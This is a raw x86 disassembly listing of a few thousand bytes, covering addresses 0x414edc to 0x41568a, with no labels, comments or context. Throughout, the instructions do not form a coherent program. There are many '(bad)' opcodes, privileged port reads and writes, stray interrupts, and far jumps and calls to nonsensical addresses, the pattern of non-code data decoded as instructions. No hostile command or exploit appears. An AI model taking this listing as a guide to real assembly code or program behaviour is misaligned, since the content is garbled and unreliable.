  414edc:	xchg   esi,eax
  414edd:	jecxz  0x414f48
  414edf:	and    BYTE PTR [ecx-0x76f72b1],bl
  414ee5:	ins    BYTE PTR es:[edi],dx
  414ee6:	test   al,0x78
  414ee8:	bound  esi,QWORD PTR [ebx+0x4b7d2bd2]
  414eee:	add    BYTE PTR [ebp+0x66b138bd],0xd3
  414ef5:	test   eax,0xdf037186
  414efa:	jnp    0x414e90
  414efc:	adc    edx,ebx
  414efe:	sar    DWORD PTR [edx],cl
  414f00:	jg     0x414f0d
  414f02:	aam    0xbd
  414f04:	fistp  DWORD PTR [esi+edx*1-0x71f0dd97]
  414f0b:	xchg   DWORD PTR [edi+0x25],edi
  414f0e:	icebp  
  414f0f:	inc    edx
  414f10:	aaa    
  414f11:	ins    DWORD PTR es:[edi],dx
  414f12:	push   edx
  414f13:	mov    DWORD PTR gs:[eax-0x7849a100],edx
  414f1a:	jmp    0x5ac1ef4e
  414f1f:	jmp    0x414f67
  414f21:	and    dl,BYTE PTR [ebp-0x2d3e1fae]
  414f27:	dec    ebp
  414f28:	sbb    BYTE PTR [ecx-0x69],ch
  414f2b:	(bad)  
  414f2c:	out    dx,eax
  414f2d:	cli    
  414f2e:	stc    
  414f2f:	inc    ebp
  414f30:	pop    ebx
  414f31:	dec    esp
  414f32:	push   ds
  414f33:	and    ah,BYTE PTR [eax+0x3d09267b]
  414f39:	push   ebx
  414f3a:	inc    ebp
  414f3b:	pop    eax
  414f3c:	mov    esi,0x765e340c
  414f41:	inc    edi
  414f42:	xchg   ebp,eax
  414f43:	cdq    
  414f44:	sub    ebp,DWORD PTR [edx-0x50f7d05a]
  414f4a:	out    dx,al
  414f4b:	sbb    al,0x7c
  414f4d:	int    0xd6
  414f4f:	mov    eax,0x2dbc9da6
  414f54:	adc    ah,ah
  414f56:	popa   
  414f57:	nop
  414f58:	test   DWORD PTR [ebx-0x12],esp
  414f5b:	cwde   
  414f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f5d:	jae    0x414f75
  414f5f:	jmp    0x414f08
  414f61:	mov    edi,0x5ba8c65f
  414f66:	and    ah,al
  414f68:	das    
  414f69:	test   al,0xc1
  414f6b:	inc    edi
  414f6c:	retf   0x1c4a
  414f6f:	and    BYTE PTR [edx],ah
  414f71:	(bad)  
  414f72:	retf   0xbc12
  414f75:	push   ebp
  414f76:	or     dl,bl
  414f78:	cld    
  414f79:	outs   dx,BYTE PTR ds:[esi]
  414f7a:	loope  0x414f17
  414f7c:	aas    
  414f7d:	dec    ecx
  414f7e:	rol    al,1
  414f80:	sbb    BYTE PTR [eax+0x365c17e8],ch
  414f86:	inc    eax
  414f87:	push   ebx
  414f88:	push   ebp
  414f89:	retf   0xc7ea
  414f8c:	aad    0x73
  414f8e:	stc    
  414f8f:	jne    0x414f2b
  414f91:	cmp    al,0xde
  414f93:	sbb    al,0xa3
  414f95:	cwde   
  414f96:	fsub   st(7),st
  414f98:	xchg   ecx,eax
  414f99:	cmp    DWORD PTR [esi-0x80],ebx
  414f9c:	(bad)  
  414f9d:	(bad)  
  414f9e:	cmp    ah,cl
  414fa0:	inc    edi
  414fa1:	mov    edi,0x1fbc0970
  414fa6:	aas    
  414fa7:	mov    cs,WORD PTR [edi]
  414fa9:	sub    bh,ch
  414fab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fac:	out    dx,al
  414fad:	in     al,0x75
  414faf:	lods   eax,DWORD PTR ds:[esi]
  414fb0:	(bad)  
  414fb1:	jb     0x414f77
  414fb3:	pusha  
  414fb4:	(bad)  
  414fb5:	or     DWORD PTR [ecx-0xbb7ab3c],ebx
  414fbb:	mov    esi,0xdcf8b7d0
  414fc0:	idiv   edi
  414fc2:	mov    eax,0x1a140ec4
  414fc7:	jb     0x414f4d
  414fc9:	adc    BYTE PTR [edx+0x34d3b3f],al
  414fcf:	rcl    BYTE PTR [ecx],cl
  414fd1:	pop    ebp
  414fd2:	call   0x6135fe6d
  414fd7:	shr    DWORD PTR [edi+0x34],1
  414fda:	pop    ecx
  414fdb:	add    al,0xa3
  414fdd:	xor    BYTE PTR [edx],al
  414fdf:	dec    ebx
  414fe0:	adc    BYTE PTR [esi+0x24],dh
  414fe3:	(bad)  
  414fe4:	cdq    
  414fe5:	(bad)  
  414fe6:	addr16 mov bl,0x46
  414fe9:	jmp    FWORD PTR [edx-0x4a]
  414fec:	inc    edx
  414fed:	(bad)  
  414fee:	jb     0x41501e
  414ff0:	and    BYTE PTR [ebx+eiz*8+0x7d168a54],bh
  414ff7:	sub    al,0x78
  414ff9:	xor    esi,DWORD PTR [edx+edi*4]
  414ffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ffd:	or     edx,0xbb3b3585
  415003:	push   ecx
  415004:	sub    al,dl
  415006:	push   esp
  415007:	popa   
  415008:	je     0x41502e
  41500a:	and    al,bh
  41500c:	inc    ebp
  41500d:	xlat   BYTE PTR ds:[ebx]
  41500e:	mov    ch,0xc2
  415010:	sub    DWORD PTR [edi+eax*1+0x537eba3],0xbc401f
  41501b:	pop    eax
  41501c:	cmp    eax,0xe1920110
  415021:	jnp    0x41504b
  415023:	add    BYTE PTR [ecx+0x22],cl
  415026:	imul   edx,DWORD PTR [esi+0x4e],0x8b3f2a8b
  41502d:	mov    al,ds:0x4540de84
  415032:	ins    DWORD PTR es:[edi],dx
  415033:	or     eax,DWORD PTR [ebx-0x20]
  415036:	stos   BYTE PTR es:[edi],al
  415037:	mov    ebp,0x48e8fafc
  41503c:	xchg   edx,eax
  41503d:	scas   eax,DWORD PTR es:[edi]
  41503e:	xchg   edx,eax
  41503f:	xchg   ecx,eax
  415040:	push   edx
  415041:	xchg   ebx,esp
  415043:	pushf  
  415044:	jl     0x414ffd
  415046:	aad    0x28
  415048:	mov    esp,DWORD PTR [edx-0x63d2c827]
  41504e:	inc    esp
  41504f:	mov    dh,0xd5
  415051:	jmp    0xe25c636e
  415056:	in     eax,dx
  415057:	aas    
  415058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415059:	daa    
  41505a:	push   esp
  41505b:	mov    ebp,0x323815af
  415060:	jnp    0x4150e0
  415062:	lods   eax,DWORD PTR ds:[esi]
  415063:	xor    eax,DWORD PTR [ecx-0x748fcde9]
  415069:	or     BYTE PTR [ecx],dh
  41506b:	xchg   ecx,eax
  41506c:	mov    eax,0x401ef5eb
  415071:	popf   
  415072:	push   esi
  415073:	shl    ebp,1
  415075:	(bad)  
  415076:	sub    DWORD PTR [eax+0x54],ecx
  415079:	jp     0x4150c2
  41507b:	xlat   BYTE PTR ds:[ebx]
  41507c:	sbb    eax,ebx
  41507e:	xchg   DWORD PTR [ebx-0x80],esp
  415081:	ficomp DWORD PTR [ebx+0x6e]
  415084:	push   ds
  415085:	adc    al,0xb
  415087:	repz jb 0x41504d
  41508a:	sub    DWORD PTR [ebx-0x491940be],esp
  415090:	mov    cl,BYTE PTR [esp+eax*1+0x27]
  415094:	lds    ebp,FWORD PTR [ebx+0x26]
  415097:	fdivr  st(0),st
  415099:	sub    DWORD PTR [ebx+0x6e2e4a1b],0xfba94cc9
  4150a3:	inc    edx
  4150a4:	mov    edi,0xcfc1f509
  4150a9:	dec    esp
  4150aa:	shr    BYTE PTR [eax],1
  4150ac:	inc    edi
  4150ad:	loop   0x415035
  4150af:	cmp    eax,0xce83f137
  4150b4:	ficom  DWORD PTR [edx]
  4150b6:	xchg   BYTE PTR [edi+0x2a],al
  4150b9:	fild   DWORD PTR [edi-0x34]
  4150bc:	stos   DWORD PTR es:[edi],eax
  4150bd:	out    0xc0,eax
  4150bf:	pop    ss
  4150c0:	rcr    DWORD PTR [edx],1
  4150c2:	xchg   ebx,eax
  4150c3:	pushf  
  4150c4:	repnz outs dx,DWORD PTR ds:[esi]
  4150c6:	xchg   ebp,eax
  4150c7:	shr    DWORD PTR [ecx+eax*2],cl
  4150ca:	pop    dx
  4150cc:	mov    eax,ds:0x51df766e
  4150d1:	cmp    DWORD PTR [ecx+0x749b7c84],eax
  4150d7:	in     al,dx
  4150d8:	out    dx,al
  4150d9:	fs fxtract 
  4150dc:	inc    esi
  4150dd:	jp     0x4150c7
  4150df:	sub    DWORD PTR [eax+esi*4+0x6f89c52f],esi
  4150e6:	in     al,dx
  4150e7:	push   es
  4150e8:	push   edx
  4150e9:	xor    al,0xb8
  4150eb:	loopne 0x4150a1
  4150ed:	mov    ds:0x545cefdd,al
  4150f2:	clc    
  4150f3:	adc    eax,0x53af98ca
  4150f8:	div    DWORD PTR [eax-0x7b]
  4150fb:	cmp    ebx,DWORD PTR ds:0xbd92c388
  415101:	jmp    0xf942:0xc9524521
  415108:	push   ebx
  415109:	repz lea edi,[eax+0x29]
  41510d:	pusha  
  41510e:	dec    eax
  41510f:	rol    BYTE PTR [ebx+0x86ace11],cl
  415115:	mov    al,ds:0xbf4fc5a2
  41511a:	mov    dh,0x41
  41511c:	retf   
  41511d:	cmc    
  41511e:	xor    eax,0xa3c241b
  415123:	and    eax,0xe226b18c
  415128:	fs push 0x62617b2e
  41512e:	and    DWORD PTR [ebx-0xd],esi
  415131:	rcl    DWORD PTR [ecx-0xa],1
  415134:	or     eax,0x776f64a3
  415139:	jmp    0x415162
  41513b:	call   0x8c88:0xed513f23
  415142:	and    eax,0x2d3fa333
  415147:	adc    edx,0x1734140b
  41514d:	(bad)  
  41514e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41514f:	ror    BYTE PTR [ebx+0x47],0x78
  415153:	mov    DWORD PTR ds:0xb1f264e4,ecx
  415159:	in     al,dx
  41515a:	fdivr  DWORD PTR [edx-0x69]
  41515d:	jb     0x41511b
  41515f:	out    0x32,al
  415161:	cmp    edi,DWORD PTR [eax]
  415163:	hlt    
  415164:	mov    ebp,0x3cf5694f
  415169:	je     0x415113
  41516b:	sbb    eax,0xcb557375
  415170:	inc    eax
  415171:	and    eax,0x1f5132aa
  415176:	mov    eax,0x2d620536
  41517b:	push   ds
  41517c:	(bad)  
  41517d:	pop    ebp
  41517e:	pop    ebp
  41517f:	add    esp,esi
  415181:	mov    edi,0x7bbdd152
  415186:	push   ds
  415187:	mov    dh,0x85
  415189:	cli    
  41518a:	call   0xa32c:0x63d8c854
  415191:	jae    0x415128
  415193:	in     eax,0xf1
  415195:	sub    cl,BYTE PTR [ebx+esi*8]
  415198:	bnd jmp 0xcf55309a
  41519e:	addr16 es mov ah,0x72
  4151a2:	xor    DWORD PTR ds:[bp+di],0xb545b5c6
  4151aa:	data16 test al,0xd6
  4151ad:	push   edx
  4151ae:	xchg   ebp,eax
  4151af:	mov    ds:0x1dcaa0de,eax
  4151b4:	outs   dx,BYTE PTR ds:[esi]
  4151b5:	mov    WORD PTR [ecx+0x7599213f],?
  4151bb:	int3   
  4151bc:	sbb    cl,ch
  4151be:	repnz (bad) 
  4151c0:	and    eax,0x25a5afd3
  4151c5:	mov    bl,0x47
  4151c7:	(bad)  
  4151c8:	les    ebx,FWORD PTR [eax]
  4151ca:	pop    edi
  4151cb:	nop
  4151cc:	in     eax,dx
  4151cd:	in     eax,0xff
  4151cf:	int    0x8
  4151d1:	stos   BYTE PTR es:[edi],al
  4151d2:	jmp    0x4151db
  4151d4:	inc    ecx
  4151d5:	sbb    eax,0x4c048838
  4151da:	pop    es
  4151db:	jmp    0xdb7b:0x7980
  4151e1:	fcmovb st,st(0)
  4151e3:	shl    DWORD PTR [edx-0x6e],cl
  4151e6:	mov    cl,0xb6
  4151e8:	imul   esi,esi,0xffffffc5
  4151eb:	mov    ah,0x36
  4151ed:	or     edi,ecx
  4151ef:	pop    ecx
  4151f0:	hlt    
  4151f1:	fild   DWORD PTR [esi]
  4151f3:	mov    ebx,0xd3fe59f3
  4151f8:	lea    ecx,[edi]
  4151fa:	or     DWORD PTR [ebx+0x305a38e],esp
  415200:	sbb    eax,0xe390d329
  415205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415206:	mov    eax,ds:0xcf87478c
  41520b:	pop    esp
  41520c:	pusha  
  41520d:	fs popf 
  41520f:	jle    0x41522d
  415211:	add    eax,0x96a64cf7
  415216:	pop    esp
  415217:	test   DWORD PTR [eax+edi*1-0x52],edi
  41521b:	mov    ch,0xcd
  41521d:	es dec esp
  41521f:	pop    edx
  415220:	dec    edx
  415221:	xchg   ah,ch
  415223:	(bad)  
  415224:	sar    dh,1
  415226:	push   0x16d90543
  41522b:	adc    al,0x0
  41522d:	jecxz  0x4151d2
  41522f:	aad    0xf1
  415231:	lahf   
  415232:	jecxz  0x41522b
  415234:	int    0xd1
  415236:	sub    al,0x79
  415238:	jecxz  0x41526e
  41523a:	jmp    FWORD PTR [ebx+ebx*2-0xe12b643]
  415241:	push   ebx
  415242:	sahf   
  415243:	in     eax,dx
  415244:	repnz jecxz 0x415220
  415247:	push   ebp
  415248:	adc    BYTE PTR [esi-0x7fbbfc7e],al
  41524e:	rcr    ecx,cl
  415250:	adc    dh,BYTE PTR [ecx+0x22]
  415253:	inc    edx
  415254:	mov    DWORD PTR [ebp+0x72],esp
  415257:	mov    esi,0x221c4e16
  41525c:	add    BYTE PTR [ecx],cl
  41525e:	in     eax,0x1f
  415260:	ins    BYTE PTR es:[edi],dx
  415261:	inc    ebp
  415262:	sbb    DWORD PTR [ebx+0x77],ebx
  415265:	mov    eax,0x9bcd6040
  41526a:	inc    ebx
  41526b:	fild   QWORD PTR [ecx]
  41526d:	(bad)  [esi-0x6e]
  415270:	sbb    al,0x0
  415272:	nop
  415273:	imul   eax,DWORD PTR [ecx+esi*1-0x11],0xffffffa2
  415278:	(bad)  
  415279:	xor    DWORD PTR [esi],0x8796af3
  41527f:	repz les edi,FWORD PTR [ebx]
  415282:	inc    esi
  415283:	les    ebp,FWORD PTR [ebp+0x54]
  415286:	fsubr  QWORD PTR [ecx-0x62]
  415289:	inc    esi
  41528a:	bound  edi,QWORD PTR [esi-0x16377237]
  415290:	sbb    DWORD PTR [esi+0x51],0x3b4117c5
  415297:	add    BYTE PTR [esi-0x5c],al
  41529a:	mov    ebx,0x193f6a9d
  41529f:	aaa    
  4152a0:	imul   esp,ecx,0x2
  4152a3:	dec    ebp
  4152a4:	scas   eax,DWORD PTR es:[edi]
  4152a5:	xor    edx,DWORD PTR [edi+0x44]
  4152a8:	int3   
  4152a9:	add    al,0xe5
  4152ab:	(bad)  
  4152ad:	push   esp
  4152ae:	jnp    0x41523d
  4152b0:	repnz xor cl,bl
  4152b3:	nop
  4152b4:	lods   al,BYTE PTR ds:[esi]
  4152b5:	sub    BYTE PTR [ecx+eiz*2-0x8],0xa5
  4152ba:	xchg   ecx,eax
  4152bb:	push   edx
  4152bc:	or     eax,0xeec56f4c
  4152c1:	sub    eax,0x7c
  4152c4:	jnp    0x415339
  4152c6:	jp     0x415290
  4152c8:	inc    ecx
  4152c9:	(bad)  
  4152ca:	sub    BYTE PTR [esi],ah
  4152cc:	(bad)  
  4152cd:	jns    0x415287
  4152cf:	ret    0xf36a
  4152d2:	ret    
  4152d3:	fst    QWORD PTR [edi+0x51]
  4152d6:	fimul  DWORD PTR [eax+esi*2]
  4152d9:	push   edx
  4152da:	inc    esp
  4152db:	xor    ebx,DWORD PTR [edx+0x73ac34fc]
  4152e1:	sub    bh,BYTE PTR [ebx-0x26]
  4152e4:	pop    ds
  4152e5:	and    al,0xba
  4152e7:	sub    DWORD PTR [ebp+0x2f],ebx
  4152ea:	aas    
  4152eb:	fidiv  DWORD PTR [ebp-0x25]
  4152ee:	je     0x4152a5
  4152f0:	aad    0x8d
  4152f2:	jp     0x41529f
  4152f4:	xor    cl,BYTE PTR ds:0x8531841a
  4152fa:	mov    WORD PTR [ecx+eiz*8-0x3],ds
  4152fe:	pusha  
  4152ff:	jns    0x41528a
  415301:	push   ss
  415302:	lahf   
  415303:	stc    
  415304:	sahf   
  415305:	and    eax,ecx
  415307:	mov    eax,ds:0x1ee2e875
  41530c:	scas   eax,DWORD PTR es:[edi]
  41530d:	lods   al,BYTE PTR ds:[esi]
  41530e:	mov    dl,0xca
  415310:	dec    eax
  415311:	popf   
  415312:	mov    edx,0x1ebc5a3d
  415317:	mov    ecx,0x49febdf1
  41531c:	loop   0x41537e
  41531e:	jae    0x415350
  415320:	push   0x74
  415322:	pop    ebp
  415323:	das    
  415324:	rcr    BYTE PTR ds:0xef7ddf46,1
  41532a:	lock inc edx
  41532c:	jno    0x415310
  41532e:	cs pop esp
  415330:	and    ch,BYTE PTR [ecx+0x77]
  415333:	xor    esp,DWORD PTR [edx-0x6]
  415336:	mov    eax,ds:0xb659fa3c
  41533b:	or     BYTE PTR [edi],ah
  41533d:	or     dh,ch
  41533f:	dec    eax
  415340:	loop   0x415376
  415342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415343:	mov    BYTE PTR [ecx+0x3093228b],0x36
  41534a:	retf   0xe4ca
  41534d:	rcl    BYTE PTR [ecx+0x57],1
  415350:	call   0x7663:0x55c74837
  415357:	aaa    
  415358:	lds    ebp,FWORD PTR [eax]
  41535a:	scas   eax,DWORD PTR es:[edi]
  41535b:	dec    edi
  41535c:	test   edi,esp
  41535e:	sub    al,0x88
  415360:	push   ebp
  415361:	fnstsw WORD PTR [esi]
  415363:	pushf  
  415364:	out    dx,al
  415365:	adc    edx,DWORD PTR [esi+0x28]
  415368:	popf   
  415369:	div    BYTE PTR [eax+0x6875b91a]
  41536f:	cs and al,0xd9
  415372:	pop    fs
  415374:	and    DWORD PTR [esi],eax
  415376:	inc    ebp
  415377:	or     esi,DWORD PTR ds:0x4706cd40
  41537d:	(bad)  
  41537e:	pop    edi
  41537f:	sbb    al,dh
  415381:	jno    0x4153a3
  415383:	pop    esi
  415384:	jecxz  0x41532b
  415386:	jb     0x4153d5
  415388:	and    esi,DWORD PTR [esi]
  41538a:	dec    ebx
  41538b:	enter  0x7033,0xe7
  41538f:	cs jb  0x415314
  415392:	pop    ecx
  415393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415394:	xchg   edx,eax
  415395:	cmp    ebp,ebp
  415397:	sahf   
  415398:	mov    ds:0xb1d34173,eax
  41539d:	int3   
  41539e:	mov    DWORD PTR [ecx+ebp*1-0x41030cee],edx
  4153a5:	pop    ebx
  4153a6:	sub    dl,BYTE PTR [ebx-0x594856ba]
  4153ac:	cmp    cl,0xe6
  4153af:	inc    esi
  4153b0:	sbb    edi,ebx
  4153b2:	in     eax,0x5d
  4153b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153b5:	dec    ebp
  4153b6:	xchg   DWORD PTR [eax],edx
  4153b8:	jl     0x41540b
  4153ba:	in     al,dx
  4153bb:	mov    ebx,0x683a2c2e
  4153c0:	(bad)  
  4153c1:	mov    ss,WORD PTR [esi+edx*1]
  4153c4:	mov    al,ds:0x7d8b1668
  4153c9:	pop    ss
  4153ca:	push   esp
  4153cb:	adc    edi,DWORD PTR [ecx-0x4b]
  4153ce:	push   eax
  4153cf:	jae    0x4153a2
  4153d1:	adc    DWORD PTR [ebx-0x5b],esi
  4153d4:	mov    ds,WORD PTR [ecx]
  4153d6:	imul   BYTE PTR [eax+edx*4]
  4153d9:	daa    
  4153da:	sbb    cl,BYTE PTR [esi-0x25262d11]
  4153e0:	imul   ebx,DWORD PTR [esi],0x56388be1
  4153e6:	mov    ecx,0x12eab1df
  4153eb:	fdiv   DWORD PTR [edx+0x5fa2d5c9]
  4153f1:	mov    ebp,0x5ff9705e
  4153f6:	adc    edi,DWORD PTR [ecx+0xf]
  4153f9:	xor    eax,0x65c35975
  4153fe:	mov    al,0x3d
  415400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415401:	outs   dx,DWORD PTR ds:[esi]
  415402:	sub    eax,0x799bbc27
  415407:	fs push edi
  415409:	das    
  41540a:	adc    BYTE PTR [ecx+0x71],bl
  41540d:	sub    DWORD PTR [esi-0x62901abe],ecx
  415413:	pop    eax
  415414:	pop    ds
  415415:	(bad)  
  415416:	ins    BYTE PTR es:[edi],dx
  415417:	cmp    DWORD PTR [esi],esp
  415419:	enter  0x71ac,0x78
  41541d:	das    
  41541e:	jl     0x4153be
  415420:	xchg   ebx,eax
  415421:	jg     0x4153b2
  415423:	imul   esi,DWORD PTR [edx+0x10],0x61
  415427:	push   edi
  415428:	sahf   
  415429:	aad    0x53
  41542b:	fst    QWORD PTR [eax]
  41542d:	xor    ch,ch
  41542f:	cs in  al,dx
  415431:	aam    0x3a
  415433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415434:	(bad)  
  415435:	aad    0x51
  415437:	adc    DWORD PTR [esi-0x2a],ebp
  41543a:	and    al,0xcb
  41543c:	ds loope 0x415483
  41543f:	mov    eax,0xd7d47cee
  415444:	lahf   
  415445:	xchg   ebx,eax
  415446:	dec    ecx
  415447:	popf   
  415448:	call   FWORD PTR [ecx]
  41544a:	mov    edx,0x96bd64e0
  41544f:	xor    cl,ah
  415451:	popa   
  415452:	stos   DWORD PTR es:[edi],eax
  415453:	(bad)  
  415455:	std    
  415456:	ret    0xa66a
  415459:	(bad)
  41545c:	xor    edi,DWORD PTR ds:0x7cd8640e
  415462:	adc    bl,cl
  415464:	xor    ebp,esp
  415466:	(bad)  
  415467:	and    ecx,DWORD PTR [eax-0x66]
  41546a:	icebp  
  41546b:	test   DWORD PTR [esi+eiz*2-0x29],esi
  41546f:	popa   
  415470:	mov    edx,0xc17201d5
  415475:	ss inc edx
  415477:	addr16 push es
  415479:	or     al,0xce
  41547b:	sbb    ah,BYTE PTR [ebp+0x34]
  41547e:	or     edi,esi
  415480:	sbb    eax,0x9c1aae32
  415485:	lea    ebx,[ebx+0x7b]
  415488:	mov    bh,0xad
  41548a:	pop    ebx
  41548b:	stos   DWORD PTR es:[edi],eax
  41548c:	mov    cl,0xa6
  41548e:	rol    BYTE PTR [ebp-0x1e],cl
  415491:	ficomp WORD PTR [ebx+0x3e]
  415494:	call   0x97a4:0x6d1a9dbe
  41549b:	inc    edx
  41549c:	popf   
  41549d:	mov    al,ds:0x344ef57a
  4154a2:	int    0xe3
  4154a4:	stc    
  4154a5:	jne    0x415456
  4154a7:	xchg   edi,eax
  4154a8:	mov    edi,0x2a218c2e
  4154ad:	stos   DWORD PTR es:[edi],eax
  4154ae:	cs dec ebp
  4154b0:	in     eax,dx
  4154b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154b2:	bound  edx,QWORD PTR [eax+0x23505932]
  4154b8:	lea    ebp,[ebx-0x59126138]
  4154be:	dec    edx
  4154bf:	ss jmp 0x83ed42c2
  4154c5:	popa   
  4154c6:	out    dx,eax
  4154c7:	mov    ecx,0xdc05e175
  4154cc:	xor    eax,edx
  4154ce:	dec    eax
  4154cf:	mov    bh,0x7b
  4154d1:	leave  
  4154d2:	stc    
  4154d3:	imul   edx,DWORD PTR [eax],0xd68dd83a
  4154d9:	inc    edx
  4154da:	sbb    al,BYTE PTR ds:0x37adb294
  4154e0:	cwde   
  4154e1:	stos   DWORD PTR es:[edi],eax
  4154e2:	mov    cl,0x6c
  4154e4:	xchg   ebp,eax
  4154e5:	add    BYTE PTR [esi+0x5d],ch
  4154e8:	bound  esp,QWORD PTR [edi]
  4154ea:	xchg   esi,ebp
  4154ec:	(bad)  
  4154ed:	rcl    ebx,1
  4154ef:	cld    
  4154f0:	lds    edi,FWORD PTR [edx-0x20549af0]
  4154f6:	jae    0x4154bb
  4154f8:	dec    edi
  4154f9:	fistp  QWORD PTR [ebx+0x45]
  4154fc:	out    0xac,eax
  4154fe:	jbe    0x4154d5
  415500:	ret    0x5655
  415503:	fdivr  st(4),st
  415505:	push   es
  415506:	adc    BYTE PTR [ebx+0x59],0xaf
  41550a:	jmp    0xbf69e4da
  41550f:	call   0x7392a43a
  415514:	pop    es
  415515:	lds    edx,FWORD PTR [ebp+0x40]
  415518:	jo     0x415553
  41551a:	sbb    al,BYTE PTR [ebp*4+0x3ebef1bf]
  415521:	lock cdq 
  415523:	shl    DWORD PTR [edx+0x45],cl
  415526:	cwde   
  415527:	das    
  415528:	and    bl,BYTE PTR [ebp-0x1e]
  41552b:	stos   DWORD PTR es:[edi],eax
  41552c:	bound  edx,QWORD PTR [eax]
  41552e:	int3   
  41552f:	jb     0x4155aa
  415531:	xor    BYTE PTR [esi-0xe],ch
  415534:	rol    DWORD PTR [eax+edx*4+0x259f22f],cl
  41553b:	daa    
  41553c:	(bad)  [edx+0x29]
  41553f:	call   0xc93161f1
  415544:	ror    DWORD PTR [ebp+0x40],0x13
  415548:	xchg   edi,eax
  415549:	jo     0x415516
  41554b:	jne    0x4155a0
  41554d:	ror    BYTE PTR [ebp+0x62],0xcc
  415551:	mov    ds,WORD PTR [esp+eax*4]
  415554:	jmp    0x3cb471c2
  415559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41555a:	sub    esp,ebx
  41555c:	sbb    BYTE PTR [esi+0x60],bl
  41555f:	sub    al,0x42
  415561:	jno    0x415538
  415563:	js     0x4154f1
  415565:	mov    ah,0x7b
  415567:	inc    edi
  415568:	dec    eax
  415569:	cmc    
  41556a:	(bad)  
  41556b:	mov    esi,0x93feef4
  415570:	jne    0x41559f
  415572:	push   edi
  415573:	popf   
  415574:	xchg   ebp,eax
  415575:	add    al,0x82
  415577:	xchg   edx,eax
  415578:	jno    0x4155e3
  41557a:	cld    
  41557b:	cmp    BYTE PTR [edi+0x4b],ah
  41557e:	push   es
  41557f:	mov    bh,0x53
  415581:	jne    0x41558d
  415583:	mov    DWORD PTR [ebp-0x510550dd],ebx
  415589:	dec    ebx
  41558a:	cli    
  41558b:	push   es
  41558c:	ins    DWORD PTR es:[edi],dx
  41558d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41558e:	xchg   ebp,eax
  41558f:	aas    
  415590:	and    BYTE PTR [edx],al
  415592:	xchg   ebx,eax
  415593:	xor    dl,bh
  415595:	jno    0x415612
  415597:	jns    0x4155e7
  415599:	daa    
  41559a:	add    eax,0xc369a09c
  41559f:	inc    edi
  4155a0:	push   ebp
  4155a1:	mov    cl,0x44
  4155a3:	inc    edx
  4155a4:	sub    BYTE PTR [eax+0x4],bl
  4155a7:	ins    DWORD PTR es:[edi],dx
  4155a8:	add    al,0x65
  4155aa:	test   ebp,edx
  4155ac:	outs   dx,BYTE PTR ds:[esi]
  4155ad:	ins    DWORD PTR es:[edi],dx
  4155ae:	xchg   DWORD PTR [eax],ecx
  4155b0:	in     eax,dx
  4155b1:	ja     0x41553e
  4155b3:	push   edx
  4155b4:	stos   BYTE PTR es:[edi],al
  4155b5:	jp     0x41557c
  4155b7:	je     0x41562a
  4155b9:	mov    al,ds:0xc44cce9d
  4155be:	add    al,0x89
  4155c0:	out    0x91,eax
  4155c2:	lahf   
  4155c3:	push   edx
  4155c4:	rcl    bh,1
  4155c6:	jl     0x415566
  4155c8:	push   ebp
  4155c9:	cmc    
  4155ca:	or     bl,ch
  4155cc:	cmc    
  4155cd:	int    0x83
  4155cf:	out    0x0,al
  4155d1:	push   DWORD PTR [ebp-0x18bdad94]
  4155d7:	mov    ecx,0x7f18ec2a
  4155dc:	dec    ebx
  4155dd:	mov    edx,0x85cea9b1
  4155e2:	adc    al,0x6b
  4155e4:	cmp    edi,DWORD PTR [ecx+eiz*4+0x46659fac]
  4155eb:	adc    BYTE PTR [ebx+ecx*8+0x16381830],0x87
  4155f3:	addr16 dec esi
  4155f5:	pop    ss
  4155f6:	jp     0x4155c0
  4155f8:	stos   BYTE PTR es:[di],al
  4155fa:	arpl   dx,bx
  4155fc:	outs   dx,DWORD PTR ds:[esi]
  4155fd:	xor    ch,bl
  4155ff:	shr    BYTE PTR [ecx-0x7d],0xb7
  415603:	das    
  415604:	mov    esp,fs
  415606:	xchg   ecx,eax
  415607:	fabs   
  415609:	jmp    0x25592e0d
  41560e:	sbb    eax,0xafc57e2a
  415613:	inc    esp
  415614:	xchg   edi,eax
  415615:	sub    eax,0x1c696b3f
  41561a:	xor    eax,0xc4132dce
  41561f:	loopne 0x415614
  415621:	pop    ebx
  415622:	cmp    al,0x9c
  415624:	fist   DWORD PTR [eax-0x67]
  415627:	dec    esp
  415628:	mov    esp,0x4fde0d72
  41562d:	stc    
  41562e:	dec    dh
  415630:	push   edx
  415631:	pop    ecx
  415632:	push   edi
  415633:	push   cs
  415634:	outs   dx,DWORD PTR ds:[esi]
  415635:	(bad)  [ecx-0x39b62de2]
  41563b:	dec    edx
  41563c:	inc    ebp
  41563d:	lock sbb BYTE PTR [edi],0xd6
  415641:	cmp    ebx,DWORD PTR [edx]
  415643:	(bad)  
  415645:	push   ebx
  415646:	sar    BYTE PTR ds:0x12d640a1,cl
  41564c:	gs shl edi,cl
  41564f:	out    dx,al
  415650:	outs   dx,BYTE PTR ds:[esi]
  415651:	dec    edx
  415652:	daa    
  415653:	icebp  
  415654:	in     eax,dx
  415655:	sbb    al,BYTE PTR [esi+0x4b]
  415658:	out    dx,eax
  415659:	pop    ss
  41565a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41565b:	mov    esi,0x7eae28e5
  415660:	jmp    0x41560b
  415662:	add    BYTE PTR [ebx+0x277de695],dh
  415668:	sub    DWORD PTR [esi+0x31],esi
  41566b:	jp     0x4156da
  41566d:	daa    
  41566e:	push   ds
  41566f:	es in  al,0x20
  415672:	mov    al,0xaa
  415674:	cmp    ebx,DWORD PTR [esi]
  415676:	inc    ebp
  415677:	call   0xf65a42bf
  41567c:	daa    
  41567d:	in     eax,dx
  41567e:	and    eax,0xb4397128
  415683:	mov    WORD PTR [eax+ebp*1-0x6cb7c698],?
  41568a:	or     dh,BYTE PTR [ebp-0x5d973f49]
